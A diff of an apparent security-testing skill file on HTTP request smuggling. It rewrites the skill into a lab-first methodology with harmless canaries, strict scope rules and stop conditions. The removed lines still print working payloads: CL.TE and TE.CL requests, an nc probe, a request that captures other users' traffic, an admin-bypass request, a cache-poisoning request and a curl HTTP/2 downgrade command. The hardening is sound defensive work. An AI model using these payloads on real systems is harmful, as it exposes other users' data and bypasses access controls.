@@ -1,183 +1,150 @@
 ---
 name: attack-request-smuggling
-description: "Assess HTTP request-boundary parsing differences using explicitly authorized, low-impact desynchronization checks"
+description: "Assess HTTP request-boundary parsing differences with lab-first validation, isolated connections, harmless canaries, and strict stop conditions."
 category: "web-application"
-version: "1.1.0"
+version: "1.2.0"
 author: "cyberstrike-official"
 tags:
   - request-smuggling
   - http-desync
-  - web
-  - attack
+  - http1
+  - http2
+  - reverse-proxy
 tech_stack:
-  - web
+  - http
+  - http2
+  - reverse-proxy
+  - cdn
 cwe_ids:
   - CWE-444
+  - CWE-436
 chains_with:
   - attack-cache-poison
+  - attack-host-header
   - attack-open-redirect
 prerequisites: []
 severity_boost:
-  attack-cache-poison: "Smuggling + cache = stored XSS/redirect for all users"
+  attack-cache-poison: "A parsing discrepancy raises cache impact only when an authorized isolated test shows that a harmless altered response is shared with a clean test client."
 ---
 
-# HTTP Request Smuggling
+# HTTP Request Smuggling and Desynchronization Assessment
 
 ## Objective
 
-Exploit disagreements between front-end and back-end servers on request boundary parsing (Content-Length vs Transfer-Encoding) to smuggle a second request.
+Determine whether a front-end proxy/CDN and a back-end server disagree about HTTP message boundaries, protocol conversion, or connection reuse. Request smuggling can contaminate shared connection queues and affect unrelated users; start in a lab and do not attempt to capture other users' requests or bypass controls on production systems.
+
+## Scope and Safety Preconditions
+
+- Confirm the exact host, proxy path, protocol, and testing window are in scope. Request-smuggling testing must be expressly allowed by the program.
+- Preferred setup: an isolated local/staging front end and origin with synthetic responses, no real users, and no sensitive data. Use dedicated connections rather than a shared browser pool.
+- For live systems, use only vendor-approved non-destructive differential checks on a dedicated test endpoint and connection. Do not send ambiguous framing payloads through shared production traffic without written approval and a rollback/stop plan.
+- Never try to capture, prefix, or append another user's request; don't use authenticated admin requests as smuggled content; don't alter shared cache entries as default proof.
+- Stop if the origin response order becomes unexpected, the connection appears desynchronized, unrelated data appears, error rates rise, or service stability changes.
 
 ## Testing Methodology
 
-### Phase 1: Detect Smuggling
+### Phase 1: Map the HTTP path
 
-**CL.TE (front uses Content-Length, back uses Transfer-Encoding):**
+Identify the client-facing layer, origin/reverse proxy, protocol versions, connection reuse, TLS termination, and whether HTTP/2 is translated to HTTP/1.1. Record known infrastructure/configuration where available. A CDN header or an HTTP/2 response alone does not identify how the origin parses requests.
 
-```http
-POST / HTTP/1.1
-Host: TARGET
-Content-Length: 13
-Transfer-Encoding: chunked
+Review current vendor documentation and configuration first. Distinguish normal request normalization from a parser discrepancy that changes message boundaries.
 
-0
+### Phase 2: Establish normal baseline behavior
 
-SMUGGLED
-```
+Use a dedicated test endpoint that returns a harmless fixed marker and request identifier. Record method, path, request headers, declared body length, negotiated protocol, connection behavior, response status/body hash, and timing. Send normal sequential requests over both fresh and reused connections where the test harness permits.
 
-**TE.CL (front uses Transfer-Encoding, back uses Content-Length):**
+Use a second harmless endpoint as a control so a timing difference or generic error can be distinguished from normal application behavior. Keep test requests serial unless an isolated harness requires controlled concurrency.
 
-```http
-POST / HTTP/1.1
-Host: TARGET
-Content-Length: 3
-Transfer-Encoding: chunked
+### Phase 3: Identify the parsing class in an isolated lab
 
-8
-SMUGGLED
-0
+Reproduce one message-framing condition at a time between the same front-end and origin versions/configurations. Use a lab fixture with two benign endpoints that return different static markers, so any boundary discrepancy is visible without invoking privileged functions or handling private data.
 
-```
+Classify the observed hypothesis rather than presuming exploitability:
+- **CL.TE:** front end and origin differ in handling Content-Length versus Transfer-Encoding.
+- **TE.CL:** the reverse ordering of parser preference or interpretation.
+- **TE.TE:** intermediary differences in how transfer-encoding headers are normalized/recognized.
+- **H2.CL / H2.TE:** HTTP/2-to-HTTP/1 conversion creates an inconsistent message boundary.
+- **H2 request splitting / downgrade issue:** protocol conversion or stream framing produces unexpected downstream requests.
 
-### Phase 2: Timing-Based Detection
+Malformed requests may be rejected at the CDN or proxy and never reach the origin. A timeout, 400/403, closed connection, or different latency alone does not confirm desynchronization.
 
-Send ambiguous request, measure response time:
-- If back-end times out waiting for more data → smuggling may be possible
+### Phase 4: Confirm a harmless differential
 
-```bash
-# CL.TE detection (timeout = vulnerable)
-printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\nX' | timeout 10 nc TARGET 80
-```
+In the isolated harness, verify that the two layers parse the same byte stream differently and that the discrepancy causes a predictable harmless marker or response-order change. Repeat only enough to rule out network jitter and application behavior. Keep request bodies short and avoid payloads that leave a queue in an ambiguous state after the test ends.
 
-### Phase 3: Confirm Smuggling
+For approved production validation, use only the specific low-impact test pattern allowed by the rules of engagement. Do not attempt to cause a second request to consume part of another user's request; the isolated harness should establish parser divergence without that step.
 
-**CL.TE confirmed:**
+### Phase 5: Evaluate impact as a separate question
 
-```http
-POST / HTTP/1.1
-Host: TARGET
-Content-Length: 35
-Transfer-Encoding: chunked
+A confirmed parser discrepancy is not automatically proof of request capture, authentication bypass, or cache poisoning. Assess only in a lab or specifically approved test path whether the discrepancy could:
+- produce an unexpected route/response boundary;
+- alter a synthetic request/response marker;
+- affect cache key or response association; or
+- bypass a test-only route guard.
 
-0
+Do not test impact by prefixing real users' requests, retrieving their data, smuggling admin paths, sending reset tokens, or poisoning production assets. Link to attack-cache-poison only if a separately approved clean-client test demonstrates harmless shared-cache persistence.
 
-GET /404-proof HTTP/1.1
-X: x
-```
+### Phase 6: Verify cleanup and regression
 
-If next request to `/` returns 404 or different page, smuggling is confirmed.
-
-### Phase 4: Exploitation
-
-**Capture other user's request:**
-```http
-POST / HTTP/1.1
-Host: TARGET
-Content-Length: 100
-Transfer-Encoding: chunked
-
-0
-
-POST /log HTTP/1.1
-Content-Length: 10000
-Content-Type: application/x-www-form-urlencoded
-
-data=
-```
-Next user's request is appended to `data=` parameter.
-
-**Bypass front-end access controls:**
-```http
-POST / HTTP/1.1
-Host: TARGET
-Content-Length: 50
-Transfer-Encoding: chunked
-
-0
-
-GET /admin HTTP/1.1
-Host: TARGET
-X: x
-```
-
-**Cache poisoning via smuggling:**
-```http
-POST / HTTP/1.1
-Host: TARGET
-Content-Length: 100
-Transfer-Encoding: chunked
-
-0
-
-GET /static/main.js HTTP/1.1
-Host: evil.com
-X: x
-```
-
-### Phase 5: H2.CL / H2 Smuggling
-
-```bash
-# HTTP/2 downgrade smuggling
-curl --max-time 15 --connect-timeout 5 --http2 https://TARGET/ \
-  -H "Content-Length: 0" \
-  -H "Transfer-Encoding: chunked" \
-  -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\n\r\n"
-```
+Close dedicated connections, reset the lab/proxy, clear synthetic cache entries, and confirm ordinary sequential requests return expected markers. Preserve the front-end/origin versions, config snippets, response ordering, and the smallest sanitized test case. Recommend consistent parser behavior, disabling ambiguous framing, patching intermediaries, and safe protocol downgrade configuration.
 
 ## What Constitutes a Finding
 
-| Finding | Severity |
-|---------|----------|
-| Request smuggling → capture user requests | Critical (P1) |
-| Smuggling → admin access bypass | Critical (P1) |
-| Smuggling → cache poisoning | Critical (P1) |
-| CL.TE or TE.CL desync confirmed | High (P2) |
+- **Candidate / lead:** HTTP/2 downgrade, duplicate framing headers, a timeout, or a malformed-request error suggests possible parser inconsistency.
+- **Confirmed desynchronization:** an isolated controlled test reproducibly shows the front-end and origin interpreting message boundaries differently, with a harmless marker proving the discrepancy.
+- **Impact-qualified finding:** a separately authorized test demonstrates the exact security effect. Do not claim request capture, admin bypass, cross-user impact, or cache poisoning from parser divergence alone.
+- **Not a finding:** a malformed request rejected consistently, a single timing spike, a proxy-generated 400/403, or a scanner alert without an origin-side differential.
 
 ## Evidence Requirements
 
-- Smuggling variant (CL.TE, TE.CL, TE.TE, H2.CL)
-- Proof of desync (wrong response, timing, captured request)
-- Impact demonstration (auth bypass, cache poison, request capture)
+- Exact in-scope host/path, client/front-end/origin protocol, and timestamp.
+- Sanitized normal baseline and controlled lab differential; remove any authentication headers, tokens, or sensitive body content.
+- Evidence of which layer interpreted the message boundary and how the harmless marker changed.
+- Connection isolation details, repeat count, response order/body hashes, and stop/cleanup result.
+- Clearly label lab-only, staging, or production confirmation and separate parser discrepancy from any independently demonstrated impact.
 
-## Verification and Safe-Testing Gate
+## Tools
 
-- Request smuggling can affect other users and shared connections. Test only when the program explicitly permits desynchronization testing; prefer a dedicated test environment or isolated connection.
-- Begin with passive protocol/header observations and low-impact probes. Do not use payloads designed to poison real users' responses, bypass authentication for other users, or cause persistent queue desynchronization.
-- A timeout, 400/403 response, or connection close is not sufficient proof. Correlate front-end/back-end behavior and demonstrate a reproducible parsing discrepancy with a harmless marker.
-- Avoid high concurrency and stop immediately if unrelated responses appear, connections become unstable, or another user's request could be affected.
-- Treat cache poisoning and authorization impact as separate findings unless you independently demonstrate the chain. Link to `attack-cache-poison` only when a clean request receives a poisoned shared response.
-## Differential Validation and Safety Controls
+- **Burp Suite with HTTP/2 support:** inspect protocol and request normalization; use extensions only under the engagement's explicit testing rules.
+- **curl / OpenSSL:** establish protocol negotiation and ordinary baselines, not as proof of a desync by themselves.
+- **Local proxy/origin harness:** preferred place to study CL.TE, TE.CL, TE.TE, and HTTP/2 downgrade differences.
+- **Reverse-proxy configuration review:** compare framing normalization and backend protocol settings.
+- **Logs from the test harness:** correlate request IDs and response ordering without collecting unrelated traffic.
 
-Request smuggling can desynchronize shared connections and affect other users. Use a dedicated test environment or an explicitly approved isolated endpoint; do not send ambiguous framing probes through shared production traffic without written authorization.
+## Request-Smuggling Classification Matrix
 
-1. Map the proxy/CDN and origin path, protocol versions, and whether HTTP/2 is translated to HTTP/1.1.
-2. Establish a normal-request baseline and record connection reuse, response order, and server behavior.
-3. Use a vendor-approved, non-destructive differential test against a dedicated connection. Change one framing variable at a time and avoid payloads that could contaminate a shared queue.
-4. Confirm the proxy and origin parse the same bytes differently; a timeout or one malformed-request error alone is inconclusive.
-5. Stop after minimal confirmation. Do not attempt to capture another user's request or poison shared responses as proof.
+| Class | Potential mismatch | Safe validation target |
+|---|---|---|
+| CL.TE | Content-Length versus chunked transfer interpretation | Isolated front-end/origin with static canary endpoints |
+| TE.CL | Reverse parser preference | Isolated harness only |
+| TE.TE | Different normalization of transfer-encoding headers | Local/version-matched proxy stack |
+| H2.CL | HTTP/2 downgrade combined with Content-Length handling | Dedicated test route and isolated backend |
+| H2.TE | HTTP/2 to HTTP/1 conversion and transfer-encoding | Vendor-approved lab fixture |
+| Connection reuse | Response/request association diverges on a reused connection | Serial synthetic requests, then verify normal behavior |
+| Cache interaction | Parser boundary change affects cached response association | Separate cache skill and approved isolated test cache |
 
-Include the exact protocol path, sanitized raw request, front-end/back-end response behavior, connection isolation, and the smallest reproducible evidence. State whether the finding is CL.TE, TE.CL, TE.TE, HTTP/2 downgrade-related, or unconfirmed, and avoid claiming cross-user impact without direct authorized proof.
+**Mitigation:** keep proxy/origin parsing consistent, remove ambiguous framing before forwarding, update edge/origin components, configure HTTP/2 downgrade safely, avoid unsafe connection reuse, and regression-test the complete deployed request path.
+
+## Verification and False Positives
+
+- A timeout can be caused by an incorrect body length, network delay, or a server waiting on a normal incomplete request.
+- Front ends often normalize or strip malformed headers; a client-side request does not prove the origin received the same bytes.
+- HTTP/2 support does not itself imply H2 desynchronization.
+- Scanner output must be confirmed against the exact proxy/origin stack and version.
+- A parsing difference is not equivalent to captured credentials, cross-user impact, RCE, or cache poisoning.
+- Stop before any probe that can leave a shared connection in a desynchronized state, affect live users, change privileged state, or leak request contents.
+
+## Related Skills and Chains
+
+- **attack-cache-poison:** use only when separate controlled evidence proves a shared cache serves the altered response to a clean test client.
+- **attack-host-header:** investigate authority/forwarded-host trust independently from message-boundary parsing.
+- **attack-open-redirect:** validate redirect behavior as a separate application-layer issue.
+- **triage-validation:** confirm exact scope, reproduction, and severity before writing the report.
+- **evidence-hygiene:** redact cookies, authorization headers, and any unrelated response data.
 
 ## References
 
-- [PortSwigger: Request Smuggling](https://portswigger.net/web-security/request-smuggling)
-- [James Kettle: HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
+- [PortSwigger: HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
+- [James Kettle: HTTP Desync Attacks — Request Smuggling Reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
+- [RFC 9112: HTTP/1.1](https://www.rfc-editor.org/rfc/rfc9112.html)
+- [RFC 9113: HTTP/2](https://www.rfc-editor.org/rfc/rfc9113.html)
